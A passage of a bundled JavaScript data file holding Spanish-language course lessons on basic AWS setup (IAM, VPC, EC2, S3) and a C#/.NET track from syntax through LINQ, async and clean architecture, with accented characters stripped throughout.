3. Dale acceso a la consola y asocia la poltica \`AdministratorAccess\`.
4. Loguate con ese usuario nuevo. Nunca ms uses root.
`,completed:!1},{id:"cloud-04-networking",title:"Networking Bsico",level:"junior",content:`# Leccin 4: Networking Bsico (VPC y Security Groups)

Tus servidores necesitan hablar, pero no con cualquiera.

## 1. VPC (Virtual Private Cloud)
Es tu pedazo privado de la nube. Una red virtual aislada donde pones tus recursos.
AWS te da una "Default VPC" lista para usar (sa esa por ahora).

## 2. Subnets (Subredes)
Divisiones dentro de tu VPC.
*   **Subnet Pblica:** Tiene ruta a Internet (Internet Gateway). Aqu pones tu Servidor Web.
*   **Subnet Privada:** NO tiene acceso directo desde internet. Aqu pones tu Base de Datos (por seguridad).

## 3. Direcciones IP
*   **IP Privada:** \`172.31.x.x\`. Solo sirve para hablar dentro de AWS. Fija mientras la instancia viva.
*   **IP Pblica:** \`54.23.x.x\`. Accesible desde tu casa. Cambia si apagas y prendes la instancia (a menos que uses una Elastic IP).

## 4. Security Groups (El Firewall)
Son firewalls virtuales a nivel de instancia. Por defecto **Niegan todo**. Tienes que abrir puertos explcitamente.
*   **Inbound (Entrada):**
    *   Puerto 22 (SSH): Para administrar Linux. brelo solo a TU IP (\`My IP\`).
    *   Puerto 80 (HTTP): Para que el mundo vea tu web. brelo a \`0.0.0.0/0\` (Todo internet).
*   **Outbound (Salida):** Normalmente todo abierto (\`Allow All\`).

---

### Misin Junior:
Cuando lances tu EC2:
1. Crea un Security Group nuevo llamado \`web-sg\`.
2. Agrega regla: Allow SSH (22) from My IP.
3. Agrega regla: Allow HTTP (80) from Anywhere (0.0.0.0/0).
Si no haces esto, tu servidor ser inaccesible.
`,completed:!1},{id:"cloud-05-deploy-basico",title:"Deploy Bsico",level:"junior",content:`# Leccin 5: Deploy Bsico (Tu Hola Mundo en la Nube)

Vamos a poner algo real en internet.

## Paso 1: Lanzar Instancia (EC2)
1.  Consola AWS -> EC2 -> Launch Instance.
2.  Nombre: \`MiPrimerServidor\`.
3.  OS: Ubuntu 22.04 LTS.
4.  Instance Type: \`t2.micro\` (Free tier).
5.  Key Pair: Crea una nueva (\`mi-llave.pem\`). **DESCRGALA Y GURDALA BIEN.** Es la nica forma de entrar.
6.  Network settings: Selecciona "Allow SSH" y "Allow HTTP traffic from the internet".

## Paso 2: Conectarse
Usa tu terminal (o Putty en Windows).
\`\`\`bash
# Permisos a la llave (solo lectura para m) - Vital en Linux/Mac
chmod 400 mi-llave.pem

# Conectar
ssh -i mi-llave.pem ubuntu@<IP-PUBLICA-DE-EC2>
\`\`\`
Si ves \`ubuntu@ip-172-x-x-x:~$\`, ests dentro de la nube.

## Paso 3: Instalar Servidor Web
\`\`\`bash
sudo apt update
sudo apt install nginx -y
\`\`\`
Ve a tu navegador y pon la IP Pblica. Deberas ver "Welcome to nginx!".

## Paso 4: Subir Archivos a S3
Para archivos estticos (imgenes, PDFs), no uses el disco del servidor, usa S3.
1. Consola AWS -> S3 -> Create Bucket.
2. Nombre nico: \`mi-proyecto-assets-123\`.
3. Desactiva "Block all public access" (si quieres que sean visibles). Ojo, te pedir confirmar que eres consciente del riesgo.
4. Sube una imagen \`logo.png\`.
5. Entra al objeto y copia su "Object URL".

---

### Misin Junior:
1. Edita el archivo \`index.html\` en tu EC2: \`sudo nano /var/www/html/index.html\`.
2. Escribe un HTML simple que diga "Hola Mundo desde AWS".
3. Inserta la imagen que subiste a S3 usando la etiqueta \`<img>\`.
4. Guarda y visita tu IP pblica. Tienes una web hbrida (Compute + Storage)!
`,completed:!1},{id:"cloud-06-proyecto-final-junior",title:"Proyecto Final Junior Cloud",level:"junior",content:`# Proyecto Final Nivel Junior: "Infraestructura Base"

Vas a provisionar tu primer entorno de desarrollo en la nube de forma manual para entender las piezas.

## Objetivo
Tener un servidor web accesible pblicamente y un almacenamiento de objetos configurado.

## Requisitos
1.  **Cuenta AWS:** Free tier activa.
2.  **IAM:** Usuario administrador creado (no root).
3.  **EC2:**
    *   Instancia \`t2.micro\` corriendo Linux.
    *   Security Group configurado correctamente (SSH solo t, HTTP mundo).
    *   Servidor Nginx o Apache instalado y corriendo.
4.  **S3:**
    *   Un bucket creado.
    *   Un archivo \`index.html\` subido al bucket (esta vez serviremos el HTML desde S3 como web esttica, no desde EC2).
    *   Habilitar "Static website hosting" en las propiedades del bucket S3.

## Entregable (Checklist Personal)
*   [ ] Puedo conectarme por SSH a mi servidor sin errores de timeout.
*   [ ] Mi servidor responde en el puerto 80 (HTTP).
*   [ ] Mi bucket S3 tiene una URL pblica de endpoint web (\`...s3-website...\`).
*   [ ] He borrado (Terminated) la instancia EC2 al terminar para no gastar mis horas gratis innecesariamente.

Felicidades! Has dado el primer paso fuera de tu mquina local.
`,completed:!1}]},Xb={id:"csharp",title:"C# / .NET",description:"Domina el ecosistema empresarial ms robusto del mundo. Desde aplicaciones de consola hasta la nube con ASP.NET Core.",completed:!1,track:"Especializacin Backend Enterprise",lessons:[{id:"csharp-01-intro-csharp",title:"Introduccin a C# y .NET",level:"junior",content:`# Leccin 1: Introduccin a C# y .NET

C# (C-sharp) es un lenguaje moderno, multiparadigma y fuertemente tipado desarrollado por Microsoft. Funciona sobre la plataforma **.NET**, un ecosistema gigante para crear cualquier tipo de aplicacin (Web, Escritorio, Mvil, Cloud, IoT, IA).

## 1. Qu es .NET?
Es el "Runtime" donde corre C#. Similar a la JVM de Java.
*   **.NET (Core):** La versin moderna, open-source y multiplataforma (Windows, Linux, Mac).
*   **.NET Framework:** La versin antigua (solo Windows). Evtala si puedes!

## 2. Hello World
\`\`\`csharp
// Program.cs (Top-level statements en .NET 6+)
Console.WriteLine("Hola Mundo desde C#");
\`\`\`
Antes de .NET 6, haba mucho "boilerplate" (\`class Program\`, \`void Main\`, etc.), pero ahora es directo.

## 3. Compilacin
C# se compila a **IL (Intermediate Language)**, que luego el **CLR (Common Language Runtime)** ejecuta en tu mquina usando JIT (Just-In-Time compilation) para mximo rendimiento.

---

### Misin Junior:
Instala el **SDK de .NET 8** y crea tu primer proyecto en la terminal con \`dotnet new console -o MiApp\`. Ejectalo con \`dotnet run\`.
`,completed:!1},{id:"csharp-02-sintaxis-tipos",title:"Sintaxis Bsica y Tipos de Datos C#",level:"junior",content:'# Leccin 2: Sintaxis Bsica y Tipos de Datos C#\n\nC# es estrictamente tipado y sensible a maysculas (case-sensitive). Usa `{}` para bloques y `;` al final de cada statement.\n\n## 1. Tipos de Datos Primitivos\n*   **Enteros:** `int`, `long`, `byte`, `short`.\n*   **Flotantes:** `double` (rpido), `float`, `decimal` (precisin financiera, 128 bits).\n*   **Texto:** `string` (UTF-16), `char`.\n*   **Boolean:** `bool` (true/false).\n*   **Dinmico:** `dynamic` y `var`.\n    *   `var x = 10;` (El compilador infiere que x es int. Sigue siendo tipado estticamente).\n    *   `dynamic y = 10;` (Chequeo en tiempo de ejecucin. Evtalo al principio).\n\n## 2. String Interpolation\nLa forma moderna de combinar texto.\n```csharp\nstring nombre = "Ana";\nint edad = 30;\nstring mensaje = $"Hola, {nombre}, tienes {edad} aos.";\n```\n\n## 3. Arrays\n```csharp\nint[] numeros = { 1, 2, 3, 4, 5 };\nstring[] dias = new string[7];\n```\n\n---\n\n### Misin Junior:\nUsa `decimal` siempre que manejes dinero. `double` tiene problemas de redondeo binario (0.1 + 0.2 != 0.3).\n',completed:!1},{id:"csharp-03-control-flujo",title:"Control de Flujo (If, Switch, Loops)",level:"junior",content:`# Leccin 3: Control de Flujo (If, Switch, Loops)

C# tiene todas las estructuras de control clsicas, ms algunas modernas.

## 1. Condicionales (If/Else)
\`\`\`csharp
if (edad >= 18) {
    Console.WriteLine("Mayor de edad");
} else {
    Console.WriteLine("Menor de edad");
}
\`\`\`

## 2. Switch Expressions (Moderno)
Sintaxis limpia y funcional introducida en C# 8.
\`\`\`csharp
string resultado = dia switch {
    1 => "Lunes",
    2 => "Martes",
    _ => "Otro da" // Default
};
\`\`\`

## 3. Bucles (Loops)
*   **While:** \`while (cond) { ... }\`
*   **Do-While:** \`do { ... } while (cond);\`
*   **For:** \`for (int i=0; i<10; i++) { ... }\`
*   **Foreach:** Itera sobre colecciones. El ms usado.
    \`\`\`csharp
    foreach (var item in lista) {
        Console.WriteLine(item);
    }
    \`\`\`

---

### Misin Junior:
Acostmbrate a usar \`foreach\` en lugar de \`for\` cuando no necesites el ndice. Es ms seguro y legible.
`,completed:!1},{id:"csharp-04-metodos",title:"Mtodos y Funciones en C#",level:"junior",content:`# Leccin 4: Mtodos y Funciones en C#

Un mtodo es una subrutina. Siempre pertenecen a una clase (en POO) o archivo (Top-Level).

## 1. Declaracin
\`\`\`csharp
public int Sumar(int a, int b) {
    return a + b;
}
\`\`\`
*   \`public\` (Modificador de acceso).
*   \`int\` (Tipo de retorno).
*   \`(int a, int b)\` (Parmetros).

## 2. Argumentos Nombrados
Puedes poner los argumentos en cualquier orden si los nombras. Ideal si hay muchos argumentos opcionales.
\`\`\`csharp
static void CrearUsuario(string nombre, int edad = 18, bool isAdmin = false) { ... }
// Llamada:
CrearUsuario(edad: 25, nombre: "Juan");
\`\`\`

## 3. Funciones Flecha (Expression-Bodied Members)
Para funciones de una sola lnea, la sintaxis es muy concisa.
\`\`\`csharp
public int Doble(int x) => x * 2;
\`\`\`

## 4. Params
Para recibir un nmero variable de argumentos (VarArgs).
\`\`\`csharp
void Imprimir(params int[] numeros) { ... }
Imprimir(1, 2, 3);
Imprimir(1);
\`\`\`

---

### Misin Junior:
Usa \`PascalCase\` para nombres de mtodos (\`CalcularTotal\`) y \`camelCase\` para variables locales y parmetros (\`totalImpuestos\`). Es la convencin estndar en .NET.
`,completed:!1},{id:"csharp-05-clases-basicas",title:"Clases y Objetos Bsicos en C#",level:"junior",content:`# Leccin 5: Clases y Objetos Bsicos en C#

C# es POO puro. Todo (o casi) es un objeto.

## 1. Declaracin Clsica
\`\`\`csharp
public class Persona
{
    public string Nombre; // Campo pblico (Evtalo)
    private int edad;     // Campo privado

    public Persona(string nombre, int edad) { // Constructor
        Console.WriteLine("Creando persona...");
        Nombre = nombre;
        this.edad = edad;
    }
}
\`\`\`

## 2. Propiedades e Inicializadores
Usa Properties (\`get; set;\`) en lugar de getters/setters manuales como Java.
\`\`\`csharp
public class Producto {
    public string Nombre { get; set; } = ""; // Valor por defecto
    public decimal Precio { get; set; }
}

// Inicializador de Objetos (Object Initializer)
var p = new Producto {
    Nombre = "Libro",
    Precio = 20.5m
};
\`\`\`

## 3. Clases Estticas
Como \`Math\` o \`Console\`. No se pueden instanciar.

---

### Misin Junior:
Nunca expongas \`fields\` pblicos directamente. Usa propiedades (\`public int Edad { get; set; }\`). Permite validacin futura sin romper clientes.
`,completed:!1},{id:"csharp-06-practica-junior",title:"Primeros Pasos con C#",level:"junior",content:`# Prctica: Primeros Pasos con C#

Manos al teclado! El objetivo de esta prctica es familiarizarte con la sintaxis, el entorno .NET y la creacin de clases sencillas.

---

## Ejercicio 1: Calculadora de IMC (Consola)
Crea una aplicacin de consola que:
1.  Pida al usuario su peso (kg) y altura (m).
2.  Calcule el IMC (ndice de Masa Corporal = peso / altura).
3.  Imprima el resultado con 2 decimales y una clasificacin:
    *   < 18.5: Bajo peso
    *   18.5 - 24.9: Normal
    *   25 - 29.9: Sobrepeso
    *   >= 30: Obesidad

## Ejercicio 2: Lista de Tareas (Array)
Crea un programa que permita almacenar 5 tareas en un array fijo (\`string[]\`).
*   Debe permitir al usuario ingresar las 5 tareas una por una.
*   Luego, debe imprimirlas en formato lista: \`1. Comprar pan\`.

## Ejercicio 3: Clase \`CuentaBancaria\`
*   Define una clase \`Cuenta\` con propiedades: \`Titular\` (string), \`Saldo\` (decimal, privado).
*   Mtodos pblicos: \`Depositar(monto)\` y \`Retirar(monto)\`.
    *   Validar que no se puede retirar ms de lo que hay.
*   Sobreescribe el mtodo \`ToString()\` para mostrar: "Cuenta de Juan: $1000".

---

### Solucin Sugerida (Parte 1):
\`\`\`csharp
Console.Write("Peso (kg): ");
double peso = double.Parse(Console.ReadLine());

Console.Write("Altura (m): ");
double altura = double.Parse(Console.ReadLine());

double imc = peso / (altura * altura);
Console.WriteLine($"Tu IMC es: {imc:F2}");
\`\`\`
`,completed:!1,isProject:!0},{id:"csharp-07-encapsulamiento",title:"Encapsulamiento y Propiedades Avanzadas",level:"junior",content:`# Leccin 7: Encapsulamiento y Propiedades Avanzadas

El encapsulamiento protege el estado interno de un objeto. En C#, las **Properties** son la herramienta principal.

## 1. Modificadores de Acceso
*   \`public\`: Sin restricciones.
*   \`private\`: Solo dentro de la misma clase.
*   \`protected\`: Dentro de la clase y sus hijas.
*   \`internal\`: Solo dentro del mismo proyecto (Ensamblado).

## 2. Auto-Properties vs Full Properties
\`\`\`csharp
public class Usuario {
    // Auto-property (Concisa)
    public string Nombre { get; set; }

    // Full property (Con lgica de validacin)
    private int _edad;
    public int Edad {
        get { return _edad; }
        set {
            if (value < 0) throw new ArgumentException("La edad no puede ser negativa");
            _edad = value;
        }
    }
}
\`\`\`

## 3. Init-Only Properties (C# 9)
Permiten que el valor se asigne solo durante la creacin del objeto.
\`\`\`csharp
public int Id { get; init; }
\`\`\`

---

### Misin Junior:
Usa \`private set;\` si quieres que el mundo lea la propiedad pero solo la clase pueda modificarla: \`public decimal Saldo { get; private set; }\`.
`,completed:!1},{id:"csharp-08-herencia-polimorfismo",title:"Herencia y Polimorfismo",level:"junior",content:`# Leccin 8: Herencia y Polimorfismo

C# permite heredar de una sola clase (Herencia simple) pero implementar mltiples interfaces.

## 1. Herencia (\`:\`)
Usamos el smbolo \`:\` para indicar que una clase hereda de otra.
\`\`\`csharp
public class Animal {
    public string Nombre { get; set; }
    public void Comer() => Console.WriteLine("Comiendo...");
}

public class Perro : Animal {
    public void Ladrar() => Console.WriteLine("Guau!");
}
\`\`\`

## 2. Polimorfismo (\`virtual\` y \`override\`)
Para que un mtodo sea sobrescrito, el padre debe marcarlo como \`virtual\` y el hijo como \`override\`.
\`\`\`csharp
public class Empleado {
    public virtual void Trabajar() => Console.WriteLine("Haciendo cosas de oficina...");
}

public class Desarrollador : Empleado {
    public override void Trabajar() => Console.WriteLine("Escribiendo cdigo en C#...");
}
\`\`\`

## 3. Acceso al Padre (\`base\`)
Usa \`base\` para llamar a constructores o mtodos de la clase base.
\`\`\`csharp
public Perro(string nombre) : base(nombre) { ... }
\`\`\`

---

### Misin Junior:
El polimorfismo te permite tratar a un \`Desarrollador\` como un \`Empleado\` genrico, pero que siga ejecutando su propia lgica de trabajo. Es la clave para crear sistemas escalables.
`,completed:!1},{id:"csharp-09-interfaces",title:"Interfaces y Clases Abstractas",level:"junior",content:`# Leccin 9: Interfaces y Clases Abstractas

Qu puede hacer un objeto? Las interfaces definen el "Qu", no el "Cmo".

## 1. Interfaces (\`interface\`)
Por convencin, empiezan con la letra \`I\`. No tienen campos (fields) y todos sus miembros son pblicos por defecto.
\`\`\`csharp
public interface IVolador {
    void Volar();
}

public class Avion : IVolador {
    public void Volar() => Console.WriteLine("El avin despega con motores.");
}
\`\`\`

## 2. Clases Abstractas (\`abstract\`)
Son clases a medio camino. Pueden tener lgica implementada y mtodos que obligatoriamente deben definir los hijos.
\`\`\`csharp
public abstract class Figura {
    public abstract double CalcularArea(); // Sin implementacin
    public void Imprimir() => Console.WriteLine("Soy una figura");
}
\`\`\`

## 3. Cundo usar cul?
*   **Interfaces:** Cuando quieres definir una capacidad comn entre clases que no tienen nada que ver entre s (Ej: \`IClonable\`).
*   **Abstractas:** Cuando hay un parentesco real y quieres compartir cdigo base.

---

### Misin Junior:
En el mundo profesional de .NET, programamos contra **Interfaces**, no contra implementaciones concretas. Esto facilita mucho las pruebas unitarias (Unit Testing).
`,completed:!1},{id:"csharp-10-practica-junior-poo",title:"Lgica y POO Junior en C#",level:"junior",content:`# Prctica: Lgica y POO Junior en C#

Pondremos a prueba tu capacidad para estructurar objetos y validar datos.

---

## 1. Sistema de Gestin de Empleados
**Consigna:** Crea una jerarqua de clases para una empresa.
*   Clase Base: \`Empleado\` (Nombre, ID, SueldoBase).
*   Clase Hija: \`Gerente\`. El sueldo total es \`SueldoBase + Bono\`.
*   Clase Hija: \`Vendedor\`. El sueldo total es \`SueldoBase + (Comision * Ventas)\`.
*   Aade un mtodo \`ObtenerReporte()\` que imprima los datos del empleado y su sueldo final.

## 2. Validacin de Productos
**Consigna:** Crea una clase \`Producto\` con:
*   \`Nombre\`: No puede ser nulo ni vaco.
*   \`Precio\`: Debe ser mayor a 0.
*   \`PrecioConIVA\`: Propiedad de solo lectura que devuelva el precio + 21%.
*   Si se intenta asignar un valor invlido, lanza una \`ArgumentException\`.

## 3. Reto de Lgica: El Validador de Password
**Consigna:** Crea un mtodo esttico \`ValidarPassword(string pass)\` que devuelva un \`bool\`.
Debe cumplir:
1.  Mnimo 8 caracteres.
2.  Al menos una letra mayscula.
3.  Al menos un nmero.
*Pista: Usa \`Char.IsUpper(c)\` y \`Char.IsDigit(c)\` dentro de un bucle.*

---

### Ejemplo de Estructura:
\`\`\`csharp
public class Producto {
    private string _nombre;
    public string Nombre {
        get => _nombre;
        set => _nombre = !string.IsNullOrWhiteSpace(value) ? value : throw new ArgumentException("Nombre invlido");
    }
}
\`\`\`
`,completed:!1,isProject:!0},{id:"csharp-11-colecciones-genericos",title:"Colecciones y Genricos",level:"semi-senior",content:`# Leccin 11: Colecciones y Genricos

Olvdate de los arrays de tamao fijo. Las colecciones de \`System.Collections.Generic\` son tu da a da.

## 1. \`List<T>\` (La ms usada)
Arreglo dinmico. Crece automticamente.
\`\`\`csharp
var nombres = new List<string> { "Ana", "Luis" };
nombres.Add("Pedro");
nombres.Remove("Ana");
nombres.ForEach(n => Console.WriteLine(n));
\`\`\`

## 2. \`Dictionary<TKey, TValue>\` (Mapas)
Asocia claves con valores. Acceso O(1).
\`\`\`csharp
var edades = new Dictionary<string, int> {
    { "Ana", 30 },
    { "Luis", 25 }
};
edades["Pedro"] = 28; // Agregar
if (edades.TryGetValue("Ana", out int edad))
    Console.WriteLine($"Ana tiene {edad}");
\`\`\`

## 3. \`HashSet<T>\` (nicos)
Coleccin sin duplicados. Ideal para verificar membresa rpida.

## 4. Crear tus propios Genricos
\`\`\`csharp
public class Resultado<T> {
    public bool Exito { get; set; }
    public T Datos { get; set; }
    public string Error { get; set; }
}
\`\`\`

---

### Misin Semi-Senior:
Usa \`IReadOnlyList<T>\` y \`IReadOnlyDictionary<TKey, TValue>\` cuando expongas colecciones fuera de tu clase. Previene modificaciones accidentales.
`,completed:!1},{id:"csharp-12-linq",title:"LINQ (Language Integrated Query)",level:"semi-senior",content:`# Leccin 12: LINQ (Language Integrated Query)

LINQ es la feature ms poderosa de C#. Permite hacer consultas sobre cualquier coleccin usando una sintaxis funcional y elegante.

## 1. Sintaxis de Mtodo (La ms usada)
\`\`\`csharp
var empleados = new List<Empleado> { ... };

var seniors = empleados
    .Where(e => e.Experiencia > 5)
    .OrderByDescending(e => e.Sueldo)
    .Select(e => new { e.Nombre, e.Sueldo })
    .ToList();
\`\`\`

## 2. Operadores Clave
*   **Where:** Filtra. Equivale a \`filter()\` en JS.
*   **Select:** Transforma. Equivale a \`map()\` en JS.
*   **OrderBy / OrderByDescending:** Ordena.
*   **FirstOrDefault:** Primer elemento o \`null\` si no existe.
*   **Any / All:** Alguno/todos cumple la condicin?
*   **GroupBy:** Agrupa elementos.
*   **Sum / Average / Count / Max / Min:** Agregaciones.

## 3. Sintaxis de Query (Estilo SQL)
\`\`\`csharp
var resultado = from e in empleados
                where e.Experiencia > 5
                orderby e.Sueldo descending
                select e;
\`\`\`
La sintaxis de mtodo es preferida en la industria (ms flexible).

---

### Misin Semi-Senior:
LINQ es "lazy" (evaluacin diferida). No se ejecuta hasta que iteras el resultado (\`foreach\`, \`.ToList()\`, \`.Count()\`). Esto permite encadenar operaciones sin crear colecciones intermedias.
`,completed:!1},{id:"csharp-13-async-await",title:"Async/Await (Programacin Asncrona)",level:"semi-senior",content:'# Leccin 13: Async/Await (Programacin Asncrona)\n\nC# fue uno de los primeros lenguajes en tener `async/await` nativo (2012). El modelo es maduro y robusto.\n\n## 1. Por qu Async?\nCuando haces una llamada a una Base de Datos o una API, el hilo queda bloqueado esperando. Con `async`, ese hilo se libera para atender otras solicitudes.\n\n## 2. El Patrn TAP (Task-based Asynchronous Pattern)\n```csharp\npublic async Task<string> ObtenerDatosAsync() {\n    var response = await httpClient.GetAsync("https://api.ejemplo.com/datos");\n    return await response.Content.ReadAsStringAsync();\n}\n```\n*   `async` marca el mtodo como asncrono.\n*   `Task<T>` es la promesa (`Promise` en JS).\n*   `await` espera sin bloquear el hilo.\n\n## 3. Reglas de Oro\n1.  **Async all the way:** Si un mtodo llama a algo async, l tambin debera ser async.\n2.  **Nunca uses `.Result` o `.Wait()`**: Bloquea el hilo y puede causar deadlocks.\n3.  **Sufijo `Async`:** Convencin de nombrar los mtodos asncronos (`GetUserAsync`).\n4.  **`Task.WhenAll`:** Para operaciones en paralelo.\n\n```csharp\nvar tarea1 = ObtenerUsuariosAsync();\nvar tarea2 = ObtenerProductosAsync();\nawait Task.WhenAll(tarea1, tarea2);\n```\n\n---\n\n### Misin Semi-Senior:\nEn ASP.NET Core, los endpoints deben ser `async` siempre que accedan a I/O (red, disco, DB). Si no, ests desperdiciando hilos del ThreadPool y reduciendo la capacidad del servidor.\n',completed:!1},{id:"csharp-14-excepciones",title:"Excepciones y Manejo de Errores",level:"semi-senior",content:`# Leccin 14: Excepciones y Manejo de Errores

Un programa que no maneja errores es una bomba de tiempo.

## 1. Try-Catch-Finally
\`\`\`csharp
try {
    var resultado = int.Parse(input);
} catch (FormatException ex) {
    Console.WriteLine($"Error de formato: {ex.Message}");
} catch (Exception ex) { // Catch genrico siempre al final
    Console.WriteLine($"Error inesperado: {ex.Message}");
} finally {
    // Se ejecuta SIEMPRE (con o sin error)
    Console.WriteLine("Limpieza completada.");
}
\`\`\`

## 2. Excepciones Personalizadas
Crea tus propias excepciones para errores de dominio.
\`\`\`csharp
public class SaldoInsuficienteException : Exception {
    public decimal SaldoActual { get; }
    public SaldoInsuficienteException(decimal saldo)
        : base($"Saldo insuficiente: {saldo}") {
        SaldoActual = saldo;
    }
}
\`\`\`

## 3. El Patrn Result (Alternativa)
En lugar de lanzar excepciones para flujo de control, devuelve un objeto \`Result\`.
\`\`\`csharp
public record Result<T>(bool Success, T? Data, string? Error);
\`\`\`

---

### Misin Semi-Senior:
Las excepciones son para situaciones **excepcionales** (error de red, archivo corrupto). No las uses para control de flujo (Ej: verificar si un usuario existe). Para eso, devuelve \`null\` o un \`Result\`.
`,completed:!1},{id:"csharp-15-delegates-events",title:"Delegates y Events",level:"semi-senior",content:`# Leccin 15: Delegates y Events

Los Delegates son como los "punteros a funciones" de C. Los Events son la base de la programacin reactiva en .NET.

## 1. Delegates
Un Delegate es un tipo que representa una referencia a un mtodo con una firma especfica.
\`\`\`csharp
public delegate double Operacion(double a, double b);

Operacion sumar = (a, b) => a + b;
Operacion multiplicar = (a, b) => a * b;

Console.WriteLine(sumar(3, 4));       // 7
Console.WriteLine(multiplicar(3, 4)); // 12
\`\`\`

## 2. Delegates Predefinidos
No necesitas crear tus propios delegates. .NET tiene:
*   \`Action<T>\`: No retorna nada (\`void\`). Ej: \`Action<string> log = msg => Console.WriteLine(msg);\`
*   \`Func<T, TResult>\`: Retorna un valor. Ej: \`Func<int, int, int> sumar = (a, b) => a + b;\`
*   \`Predicate<T>\`: Retorna \`bool\`. Ej: \`Predicate<int> esPar = n => n % 2 == 0;\`

LINQ usa \`Func<>\` internamente para \`.Where()\`, \`.Select()\`, etc.

## 3. Events (Eventos)
Patrn Observer nativo de C#. Una clase "publica" un evento y otras se "suscriben".
\`\`\`csharp
public class Sensor {
    public event EventHandler<double> TemperaturaAlta;

    public void Leer(double temp) {
        if (temp > 40)
            TemperaturaAlta?.Invoke(this, temp); // Notificar suscriptores
    }
}

// Suscripcin
var sensor = new Sensor();
sensor.TemperaturaAlta += (sender, temp) => Console.WriteLine($"ALERTA: {temp}C!");
\`\`\`

---

### Misin Semi-Senior:
Los Events son la columna vertebral de las interfaces grficas (WPF, WinForms) y de muchos patrones de backend (CQRS, MediatR).
`,completed:!1},{id:"csharp-16-practica-semi-senior",title:"Desafo Semi-Senior C#",level:"semi-senior",content:'# Prctica: Desafo Semi-Senior C#\n\nIntegremos LINQ, Delegates, Async y Excepciones en ejercicios reales.\n\n---\n\n## 1. Procesador de Datos con LINQ\n**Consigna:** Tienes una `List<Producto>` con campos: `Nombre`, `Precio`, `Categoria`, `Stock`.\nUsando LINQ resuelve:\n1.  Productos con stock menor a 5, ordenados por precio ascendente.\n2.  Promedio de precios por categora (`GroupBy`).\n3.  Top 3 productos ms caros.\n4.  Hay algn producto con precio mayor a $10.000? (`Any`).\n\n## 2. Sistema de Notificaciones con Events\n**Consigna:**\n*   Crea una clase `Pedido` con un evento `PedidoConfirmado`.\n*   Crea una clase `NotificadorEmail` que se suscriba al evento e imprima "Email enviado a {cliente}".\n*   Crea una clase `NotificadorSMS` que se suscriba al mismo evento e imprima "SMS enviado a {telefono}".\n*   Al confirmar un pedido, ambos notificadores deben reaccionar.\n\n## 3. Cliente HTTP Async con Manejo de Errores\n**Consigna:**\n*   Crea un mtodo `async Task<string> FetchDataAsync(string url)` que simule una llamada HTTP.\n*   Usa `Task.Delay(1000)` para simular latencia.\n*   Si la URL contiene "error", lanza una `HttpRequestException`.\n*   Llama a 3 URLs en paralelo con `Task.WhenAll` y maneja los errores individualmente con `try-catch`.\n\n---\n\n### Resultado esperado:\nCdigo que demuestre fluidez con LINQ encadenado, uso correcto de events para desacoplamiento, y manejo de tareas asncronas sin bloquear hilos.\n',completed:!1,isProject:!0},{id:"csharp-17-clean-architecture-ddd",title:"Arquitectura Limpia y DDD en .NET",level:"senior",content:`# Leccin 17: Arquitectura Limpia y DDD en .NET

Escribir cdigo que funcione es fcil. Escribir cdigo que sobreviva 5 aos es el reto.

## 1. Clean Architecture (The Onion)
El objetivo es separar responsabilidades.
*   **Domain (Core):** Entidades y Lgica de Negocio pura. No depende de NADA (ni de EF Core, ni de ASP.NET).
*   **Application:** Casos de Uso (Use Cases), DTOs, Interfaces de Repositorios. Depende de Domain.
*   **Infrastructure:** Implementacin de Repositorios (EF Core), Servicios de Email, APIs externas. Depende de Application.
*   **API (Presentation):** Controllers. Depende de Application e Infrastructure (solo para inyeccin).

## 2. Domain-Driven Design (DDD) - Conceptos Clave
*   **Entity:** Objeto con identidad (ID). Ej: \`Usuario\`.
*   **Value Object:** Objeto definido por sus valores, inmutable. Ej: \`Direccion\`, \`Dinero\`.
*   **Aggregate Root:** La entidad principal que controla el acceso a otras entidades. Ej: \`Pedido\` controla sus \`Items\`. Solo el \`Pedido\` tiene Repositorio.

## 3. Implementacin en C#
\`\`\`csharp
// Domain
public class Pedido { // Aggregate Root
    public int Id { get; private set; }
    private List<ItemPedido> _items = new();
    public IReadOnlyCollection<ItemPedido> Items => _items.AsReadOnly();

    public void AgregarItem(Producto producto, int cantidad) {
        // Lgica de negocio AQU, no en el servicio
        if (cantidad <= 0) throw new DomainException("Cantidad invlida");
        _items.Add(new ItemPedido(producto, cantidad));
    }
}
\`\`\`

---

### Misin Senior:
Mueve la lgica de validacin de negocio ("No se puede vender si no hay stock") DESDE los Servicios HACIA las Entidades de Dominio. Eso crea un "Rich Domain Model" en lugar de un "Anemic Domain Model".
`,completed:!1},{id:"csharp-18-patrones-diseno",title:"Patrones de Diseo Empresariales en C#",level:"senior",content:`# Leccin 18: Patrones de Diseo Empresariales en C#

Un Senior no re-inventa la rueda. Usa soluciones probadas.

## 1. Dependency Injection (DI) - Ms all de lo bsico
*   **Inyeccin de Factoras:** \`Func<T>\` o \`IFactory\` para crear objetos bajo demanda sin violar DI.
*   **Decoradores:** Usar Scrutor (librera popular) o \`AddDecorated\` para envolver servicios (Logging, Caching) sin tocar la lgica de negocio.

\`\`\`csharp
// Decorator Pattern en .NET DI
services.Decorate<IProductRepository, CachedProductRepository>();
\`\`\`

## 2. Strategy Pattern (Evitando IFs y Switches gigantes)
Cuando tienes mltiples formas de hacer algo (ej: Calcular Impuestos para 5 pases).
\`\`\`csharp
public interface ITaxStrategy {
    decimal Calcular(decimal monto);
}

// Uso: Inyectas IEnumerable<ITaxStrategy> y eliges la correcta en runtime.
\`\`\`

## 3. CQRS (Command Query Responsibility Segregation)
Separar Lecturas (Queries) de Escrituras (Commands).
*   **Comandos:** Modifican estado. Void o return ID. Validan reglas de negocio complejas.
*   **Queries:** Solo leen. Altamente optimizadas (Dapper, SQL directo). Retornan DTOs (nunca Entidades).
*   **MediatR:** La librera estndar de facto en .NET para implementar el patrn Mediator/CQRS.

---

### Misin Senior:
Usa el patrn **Options** (\`IOptions<T>\`) para inyectar configuraciones fuertemente tipadas desde \`appsettings.json\` en lugar de leer strings sueltos.
`,completed:!1},{id:"csharp-19-performance",title:"Performance Extrema (.NET Moderno)",level:"senior",content:`# Leccin 19: Performance Extrema (.NET Moderno)

Cuando el Garbage Collector (GC) se despierta, tu aplicacin se detiene (Stop-The-World). El mejor cdigo es el que no asigna memoria.

## 1. Evitando Allocations (GC Pressure)
*   **Problema:** Cada \`new String()\` o \`new List<T>()\` en un bucle caliente (Hot Path) es trabajo para el GC ms tarde.
*   **Solucin:** Reutiliza arrays \`ArrayPool<T>.Shared.Rent(100)\`. Usa \`stackalloc\` para pequeas buffers en el stack.

## 2. Span<T> y Memory<T> (Slicing sin copias)
La feature ms revolucionaria de .NET Core. Te permite ver un pedazo de un array/string sin copiarlo.
\`\`\`csharp
string texto = "http://example.com/api";
ReadOnlySpan<char> span = texto.AsSpan();
